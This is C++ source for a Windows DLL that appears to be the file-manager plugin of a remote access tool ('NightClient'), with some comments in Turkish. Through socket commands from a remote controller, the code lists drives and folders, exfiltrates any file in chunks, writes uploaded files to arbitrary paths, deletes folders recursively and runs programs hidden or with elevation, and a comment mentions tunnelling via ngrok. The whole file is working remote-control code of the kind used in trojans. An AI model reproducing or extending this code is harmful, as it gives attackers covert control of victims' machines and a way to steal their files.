#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <shlobj.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <cstdint>
#include <algorithm>
#include <fstream>
#include <mutex>
#include <thread>
#include <atomic>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace std;

static wstring clipboard_path = L"";
static const size_t FILE_TRANSFER_CHUNK_SIZE = 64 * 1024; // 64 KB per chunk
static const uint8_t FILE_CHUNK_UPLOAD   = 1;
static const uint8_t FILE_CHUNK_DOWNLOAD = 2;

// ─── Socket Synchronization Mutex (Coordinated with client.exe) ────────────────

class SocketLock {
private:
    HANDLE hMutex;
public:
    SocketLock() {
        string mutex_name = "Local\\NightClientSocketSendMutex_" + to_string(GetCurrentProcessId());
        hMutex = CreateMutexA(NULL, FALSE, mutex_name.c_str());
        if (hMutex) {
            WaitForSingleObject(hMutex, INFINITE);
        }
    }
    ~SocketLock() {
        if (hMutex) {
            ReleaseMutex(hMutex);
            CloseHandle(hMutex);
        }
    }
};

// ─── Encoding helpers ────────────────────────────────────────────────────────

static string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

static string base64_encode(const vector<uint8_t>& buf) {
    string ret;
    int i = 0;
    uint8_t char_array_3[3];
    uint8_t char_array_4[4];
    size_t in_len = buf.size();
    const uint8_t* bytes_to_encode = buf.data();
    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; i < 4; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        int j = 0;
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; j < i + 1; j++) ret += base64_chars[char_array_4[j]];
        while (i++ < 3) ret += '=';
    }
    return ret;
}

static vector<uint8_t> base64_decode(string const& encoded_string) {
    size_t in_len = encoded_string.size();
    int i = 0, in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    vector<uint8_t> ret;
    while (in_len-- && (encoded_string[in_] != '=') &&
           (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = (uint8_t)base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) ret.push_back(char_array_3[i]);
            i = 0;
        }
    }
    if (i) {
        int j = 0;
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = (uint8_t)base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; j < i - 1; j++) ret.push_back(char_array_3[j]);
    }
    return ret;
}

// ─── String helpers ───────────────────────────────────────────────────────────

static string wide_to_utf8(const wstring& wstr) {
    if (wstr.empty()) return string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

static wstring utf8_to_wide(const string& str) {
    if (str.empty()) return wstring();
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// ─── Network helpers ──────────────────────────────────────────────────────────

static void send_raw_locked(SOCKET sock, const char* data, int len) {
    SocketLock lock;
    const char* ptr = data;
    int remaining = len;
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent <= 0) return;
        ptr += sent;
        remaining -= sent;
    }
}

static void send_json(SOCKET sock, const json& data) {
    string msg = data.dump() + "\r\n";
    send_raw_locked(sock, msg.data(), (int)msg.length());
}

#define PACKET_TYPE_JSON            0x01
#define PACKET_TYPE_DLL             0x02
#define PACKET_TYPE_MONITOR_FRAME   0x03
#define PACKET_TYPE_FILE_UPLOAD     0x04
#define PACKET_TYPE_FILE_DOWNLOAD   0x05

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature; // 0x524E ('NR')
    uint8_t  type;
    uint32_t size;
};
#pragma pack(pop)

// Thread-safe binary packet gonderimi (coordinating with client.exe main mutex)
static bool send_binary_packet(SOCKET sock, uint8_t type, const vector<uint8_t>& payload) {
    PacketHeader header;
    header.signature = 0x524E;
    header.type = type;
    header.size = (uint32_t)payload.size();

    SocketLock lock;

    // Header gonder
    const char* headerPtr = (const char*)&header;
    int headerRemaining = (int)sizeof(PacketHeader);
    while (headerRemaining > 0) {
        int sent = send(sock, headerPtr, headerRemaining, 0);
        if (sent <= 0) return false;
        headerPtr += sent;
        headerRemaining -= sent;
    }

    // Payload gonder
    const char* payloadPtr = (const char*)payload.data();
    size_t remaining = payload.size();
    while (remaining > 0) {
        int toSend = (int)min<size_t>(remaining, 32 * 1024); // 32KB'lik parcalar
        int sent = send(sock, payloadPtr, toSend, 0);
        if (sent <= 0) return false;
        payloadPtr += sent;
        remaining -= sent;
    }
    return true;
}

// ─── Chunk payload builder ────────────────────────────────────────────────────

static uint32_t read_u32_le(const uint8_t* p) {
    uint32_t v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static uint64_t read_u64_le(const uint8_t* p) {
    uint64_t v;
    memcpy(&v, p, sizeof(v));
    return v;
}

static vector<uint8_t> build_file_chunk_payload(uint8_t op, const string& name,
                                                 uint64_t offset, uint64_t totalSize,
                                                 const uint8_t* data, uint32_t dataLen) {
    const size_t headerSize = 29;
    uint32_t nameLen = (uint32_t)name.size();
    vector<uint8_t> payload(headerSize + nameLen + dataLen);
    payload[0] = 'F';
    payload[1] = 'M';
    payload[2] = 'C';
    payload[3] = '1';
    payload[4] = op;
    memcpy(payload.data() + 5,  &nameLen,   sizeof(nameLen));
    memcpy(payload.data() + 9,  &offset,    sizeof(offset));
    memcpy(payload.data() + 17, &totalSize, sizeof(totalSize));
    memcpy(payload.data() + 25, &dataLen,   sizeof(dataLen));
    if (nameLen > 0) memcpy(payload.data() + headerSize, name.data(), nameLen);
    if (dataLen > 0 && data) memcpy(payload.data() + headerSize + nameLen, data, dataLen);
    return payload;
}

// ─── Error helper ─────────────────────────────────────────────────────────────

static string get_last_error_message(DWORD errorCode) {
    if (errorCode == ERROR_SUCCESS) return "Success";
    wchar_t* buffer = nullptr;
    DWORD size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&buffer, 0, NULL
    );
    wstring wmsg = (size && buffer) ? wstring(buffer, size) : (L"Error code: " + to_wstring(errorCode));
    if (buffer) LocalFree(buffer);
    string message = wide_to_utf8(wmsg);
    while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
        message.pop_back();
    return message;
}

static string format_size(uint64_t size) {
    const char* units[] = {"B", "KB", "MB", "GB", "TB"};
    int unit = 0;
    double dSize = (double)size;
    while (dSize >= 1024 && unit < 4) {
        dSize /= 1024;
        unit++;
    }
    char buf[64];
    sprintf(buf, "%.2f %s", dSize, units[unit]);
    return string(buf);
}

static string filetime_to_string(FILETIME ft) {
    SYSTEMTIME st;
    FileTimeToSystemTime(&ft, &st);
    char buf[64];
    sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return string(buf);
}

// ─── File listing ─────────────────────────────────────────────────────────────

static void send_drives(SOCKET sock) {
    json response;
    response["action"] = "filemanager_response";
    response["type"]   = "drives";
    json drives = json::array();
    wchar_t driveStrings[512];
    DWORD length = GetLogicalDriveStringsW(512, driveStrings);
    if (length > 0) {
        wchar_t* drive = driveStrings;
        while (*drive) {
            drives.push_back(wide_to_utf8(drive));
            drive += wcslen(drive) + 1;
        }
    }
    response["drives"] = drives;
    send_json(sock, response);
}

static void send_files(SOCKET sock, wstring path) {
    if (path.empty()) {
        send_drives(sock);
        return;
    }
    if (path.back() != L'\\') path += L"\\";
    json response;
    response["action"] = "filemanager_response";
    response["type"]   = "files";
    response["path"]   = wide_to_utf8(path);
    json files = json::array();
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((path + L"*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
                continue;
            json item;
            item["name"] = wide_to_utf8(findData.cFileName);
            item["date"] = filetime_to_string(findData.ftLastWriteTime);
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                item["type"] = "Folder";
                item["size"] = "";
            } else {
                item["type"] = "File";
                uint64_t size = ((uint64_t)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
                item["size"] = format_size(size);
            }
            files.push_back(item);
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    response["files"] = files;
    send_json(sock, response);
}

static void send_log(SOCKET sock, const string& message) {
    json log;
    log["action"]  = "filemanager_response";
    log["type"]    = "log";
    log["message"] = message;
    send_json(sock, log);
}

// ─── Directory deletion ───────────────────────────────────────────────────────

static BOOL DeleteRecursiveW(const wstring& path) {
    WIN32_FIND_DATAW findData;
    wstring searchPath = path + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
        wstring fullPath = path + L"\\" + findData.cFileName;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            DeleteRecursiveW(fullPath);
        else
            DeleteFileW(fullPath.c_str());
    } while (FindNextFileW(hFind, &findData));
    FindClose(hFind);
    return RemoveDirectoryW(path.c_str());
}

// ─── Async download (her dosya icin ayri thread) ──────────────────────────────

static void do_download_file(SOCKET sock, wstring path) {
    HANDLE file = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        send_log(sock, "Download failed: Could not open file ("
                       + get_last_error_message(GetLastError()) + ")");
        return;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(file, &fileSize)) {
        DWORD err = GetLastError();
        CloseHandle(file);
        send_log(sock, "Download failed: Could not read file size ("
                       + get_last_error_message(err) + ")");
        return;
    }

    uint64_t totalSize = (uint64_t)fileSize.QuadPart;
    size_t slash = path.find_last_of(L"\\");
    string fileNameUtf8 = wide_to_utf8((slash != wstring::npos) ? path.substr(slash + 1) : path);

    vector<uint8_t> buffer(FILE_TRANSFER_CHUNK_SIZE);
    uint64_t offset = 0;
    bool failed = false;

    if (totalSize == 0) {
        vector<uint8_t> payload = build_file_chunk_payload(
            FILE_CHUNK_DOWNLOAD, fileNameUtf8, 0, 0, nullptr, 0);
        send_binary_packet(sock, PACKET_TYPE_FILE_DOWNLOAD, payload);
    } else {
        while (offset < totalSize) {
            DWORD toRead = (DWORD)min<uint64_t>((uint64_t)FILE_TRANSFER_CHUNK_SIZE, totalSize - offset);
            DWORD read = 0;
            if (!ReadFile(file, buffer.data(), toRead, &read, NULL)) {
                failed = true;
                send_log(sock, "Download failed: read error ("
                               + get_last_error_message(GetLastError()) + ")");
                break;
            }
            if (read == 0) {
                failed = true;
                send_log(sock, "Download failed: unexpected end of file");
                break;
            }

            vector<uint8_t> payload = build_file_chunk_payload(
                FILE_CHUNK_DOWNLOAD, fileNameUtf8,
                offset, totalSize, buffer.data(), read);

            if (!send_binary_packet(sock, PACKET_TYPE_FILE_DOWNLOAD, payload)) {
                failed = true;
                break;
            }
            offset += read;

            // Throttle: socket buffer'inin dolmasini ve ngrok disconnect'i onler.
            Sleep(2);
        }
    }

    CloseHandle(file);
    if (!failed) {
        send_log(sock, "File download sent: " + wide_to_utf8(path)
                       + " (" + format_size(totalSize) + ")");
    }
}

// ─── Plugin exports ───────────────────────────────────────────────────────────

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_drives(sock);
}

// Upload binary handler (server -> client dosya yuklemesi)
extern "C" __declspec(dllexport) void HandleBinary(SOCKET sock, const uint8_t* payload, size_t size) {
    if (size >= 29 && memcmp(payload, "FMC1", 4) == 0) {
        uint8_t op = payload[4];
        if (op != FILE_CHUNK_UPLOAD) return;

        uint32_t pathLen  = read_u32_le(payload + 5);
        uint64_t offset   = read_u64_le(payload + 9);
        uint64_t totalSize = read_u64_le(payload + 17);
        uint32_t dataSize = read_u32_le(payload + 25);
        size_t dataOffset = 29 + (size_t)pathLen;

        if (pathLen == 0 || pathLen > 32768 ||
            dataSize > (uint32_t)(FILE_TRANSFER_CHUNK_SIZE * 2) ||
            dataOffset > size ||
            size - dataOffset < dataSize ||
            (totalSize > 0 && offset + dataSize > totalSize)) {
            send_log(sock, "Upload failed: invalid file transfer chunk");
            return;
        }

        string pathUtf8((const char*)payload + 29, pathLen);
        wstring path = utf8_to_wide(pathUtf8);
        const uint8_t* data = payload + dataOffset;

        size_t last_slash_idx = path.find_last_of(L"\\");
        if (last_slash_idx != wstring::npos) {
            wstring dir = path.substr(0, last_slash_idx);
            SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
        }

        DWORD disposition = (offset == 0) ? CREATE_ALWAYS : OPEN_ALWAYS;
        HANDLE file = CreateFileW(path.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL,
                                  disposition, FILE_ATTRIBUTE_NORMAL, NULL);
        if (file == INVALID_HANDLE_VALUE) {
            send_log(sock, "Upload failed: Could not create file " + pathUtf8 +
                           " (Error: " + get_last_error_message(GetLastError()) + ")");
            return;
        }

        LARGE_INTEGER li;
        li.QuadPart = (LONGLONG)offset;
        if (!SetFilePointerEx(file, li, NULL, FILE_BEGIN)) {
            DWORD err = GetLastError();
            CloseHandle(file);
            send_log(sock, "Upload failed: seek error " + get_last_error_message(err));
            return;
        }

        DWORD written = 0;
        BOOL ok = TRUE;
        if (dataSize > 0) {
            ok = WriteFile(file, data, dataSize, &written, NULL);
        }

        if (ok && offset + dataSize >= totalSize) {
            LARGE_INTEGER endPos;
            endPos.QuadPart = (LONGLONG)totalSize;
            SetFilePointerEx(file, endPos, NULL, FILE_BEGIN);
            SetEndOfFile(file);
        }

        DWORD writeErr = ok ? ERROR_SUCCESS : GetLastError();
        CloseHandle(file);

        if (!ok || written != dataSize) {
            send_log(sock, "Upload failed: write error " + get_last_error_message(writeErr));
            return;
        }

        if (offset + dataSize >= totalSize) {
            send_log(sock, "File uploaded: " + pathUtf8 + " (" + format_size(totalSize) + ")");
            size_t last_slash = path.find_last_of(L"\\");
            wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
            send_files(sock, parent);
        }
        return;
    }

    // Legacy binary upload (geri uyumluluk)
    if (size < 4) return;
    uint32_t pathLen;
    memcpy(&pathLen, payload, 4);
    if (size < (4 + pathLen)) return;
    string pathUtf8((const char*)payload + 4, pathLen);
    wstring path = utf8_to_wide(pathUtf8);
    size_t dataSize2 = size - 4 - pathLen;
    const uint8_t* data = payload + 4 + pathLen;

    size_t last_slash_idx = path.find_last_of(L"\\");
    if (last_slash_idx != wstring::npos) {
        wstring dir = path.substr(0, last_slash_idx);
        SHCreateDirectoryExW(NULL, dir.c_str(), NULL);
    }

    FILE* f = _wfopen(path.c_str(), L"wb");
    if (!f) {
        send_log(sock, "Upload failed: Could not create file " + pathUtf8
                       + " (Error: " + get_last_error_message(GetLastError()) + ")");
        return;
    }
    if (dataSize2 > 0) fwrite(data, 1, dataSize2, f);
    fclose(f);

    send_log(sock, "File uploaded (Binary): " + pathUtf8);
    size_t last_slash = path.find_last_of(L"\\");
    wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
    send_files(sock, parent);
}

// JSON komut handler
extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "getdrives") {
            send_drives(sock);
        }
        else if (action == "getfiles") {
            send_files(sock, utf8_to_wide(command.value("path", "")));
        }
        else if (action == "deletefile") {
            wstring path = utf8_to_wide(command.value("path", ""));
            DWORD attr = GetFileAttributesW(path.c_str());
            BOOL success = FALSE;
            if (attr != INVALID_FILE_ATTRIBUTES) {
                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = DeleteRecursiveW(path);
                else success = DeleteFileW(path.c_str());
            }
            if (success) {
                send_log(sock, "Deleted: " + wide_to_utf8(path));
                size_t last_slash = path.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Delete failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "rename") {
            wstring oldpath = utf8_to_wide(command.value("oldpath", ""));
            wstring newpath = utf8_to_wide(command.value("newpath", ""));
            if (MoveFileW(oldpath.c_str(), newpath.c_str())) {
                send_log(sock, "Renamed to: " + wide_to_utf8(newpath));
                size_t last_slash = oldpath.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? oldpath.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Rename failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "execute") {
            wstring path = utf8_to_wide(command.value("path", ""));
            string mode = command.value("mode", "normal");
            INT show = SW_SHOWNORMAL;
            if (mode == "hidden") show = SW_HIDE;
            HINSTANCE res;
            if (mode == "runas")
                res = ShellExecuteW(NULL, L"runas", path.c_str(), NULL, NULL, show);
            else
                res = ShellExecuteW(NULL, L"open", path.c_str(), NULL, NULL, show);
            if ((uintptr_t)res > 32)
                send_log(sock, "Executed (" + mode + "): " + wide_to_utf8(path));
            else
                send_log(sock, "Execute failed: " + get_last_error_message(GetLastError()));
        }
        else if (action == "createfolder") {
            wstring path = utf8_to_wide(command.value("path", ""));
            if (CreateDirectoryW(path.c_str(), NULL)) {
                send_log(sock, "Folder created: " + wide_to_utf8(path));
                size_t last_slash = path.find_last_of(L"\\");
                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                send_files(sock, parent);
            } else {
                send_log(sock, "Create folder failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "copyfile") {
            clipboard_path = utf8_to_wide(command.value("path", ""));
            send_log(sock, "Copied to clipboard: " + wide_to_utf8(clipboard_path));
        }
        else if (action == "pastefile") {
            if (clipboard_path.empty()) {
                send_log(sock, "Clipboard is empty");
                return;
            }
            wstring dest_dir = utf8_to_wide(command.value("path", ""));
            if (dest_dir.back() != L'\\') dest_dir += L"\\";
            size_t last_slash = clipboard_path.find_last_of(L"\\");
            wstring filename = (last_slash != wstring::npos)
                               ? clipboard_path.substr(last_slash + 1)
                               : clipboard_path;
            wstring dest_path = dest_dir + filename;
            if (CopyFileW(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
                send_log(sock, "Pasted: " + wide_to_utf8(dest_path));
                send_files(sock, dest_dir);
            } else {
                send_log(sock, "Paste failed: " + get_last_error_message(GetLastError()));
            }
        }
        else if (action == "downloadfile") {
            wstring path = utf8_to_wide(command.value("path", ""));
            thread([sock, path]() {
                do_download_file(sock, path);
            }).detach();
        }
    } catch (...) {
        send_log(sock, "Client-side plugin error processing command");
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
